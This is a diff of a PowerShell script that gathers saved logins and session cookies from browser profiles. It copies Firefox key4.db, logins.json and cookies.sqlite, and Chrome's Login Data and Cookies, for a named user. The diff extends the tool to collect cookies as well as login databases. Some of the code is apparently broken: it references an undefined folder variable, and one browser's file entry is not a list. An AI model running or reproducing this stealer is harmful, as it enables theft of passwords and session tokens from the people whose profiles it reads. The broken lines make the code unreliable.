@@ -42,22 +42,24 @@ function ManageMozilla($root, $user, $d){
 # for Chrome and some browsers
 function ManageChromeProfile($root, $user, $d)
 {
-	$chrome_folder = $root + '\' + $d['name']
 
-	$path 	= $d['paths'].replace('[USER]', $user)
-	$paths 	= Get-ChildItem -Path $path -Filter $d['file'] -Recurse -ErrorAction SilentlyContinue -Force
-	
-	If ($paths -ne $null){
-		CreateDir($chrome_folder)
-		foreach ($p in $paths.Directory.Name)
+	$chrome_software_path = $d['paths'].replace('[USER]', $user)
+
+	if (Test-Path $chrome_software_path) {
+		$chrome_folder = $root + '\' + $d['name']
+		CreateDir($mozilla_folder)
+
+		$profiles = Get-ChildItem -Path $chrome_software_path
+		foreach ($profile in $profiles.Name)
 		{
-			$profile_folder = $chrome_folder + '\' + $p
+			$profile_folder = $chrome_folder + '\' + $profile
 			CreateDir($profile_folder)
-			
-			$src = $path + '\' + $p + '\' + $d['file']
-			$dst = $profile_folder + '\' + $d['file']
+			for ($i=0; $i -lt $d['files'].length; $i++) {
+				$path = $d['paths'].replace('[USER]', $user) + '\' + $profile + '\' + $d['files'][$i]
+				$dst = $profile_folder + '\' + $d['files'][$i]
 
-			CopyFile $src $dst
+				CopyFile $path $dst
+			}
 		}
 	}
 }
@@ -157,20 +159,24 @@ function Dump
 							'key4.db',
 							'key3.db',
 							'logins.json',
-							'cert8.db'
+							'cert8.db',
+							'cookies.sqlite'
 						)
 	}
 
 	$chrome = @{
 			'name' 	= 'Chrome'
 			'paths'	= @('C:\Users\[USER]\AppData\Local\Google\Chrome\User Data')
-			'file' 	= 'Login Data'
+			'files' = @(
+							'Login Data',
+							'Cookies'
+						)
 	}
 
 	$coccoc = @{
 			'name' 	= 'Coccoc'
 			'paths'	= @('C:\Users\[USER]\AppData\Local\CocCoc\Browser\User Data')
-			'file' 	= 'Login Data'
+			'files' 	= 'Login Data'
 	}
 
 	$opera = @{
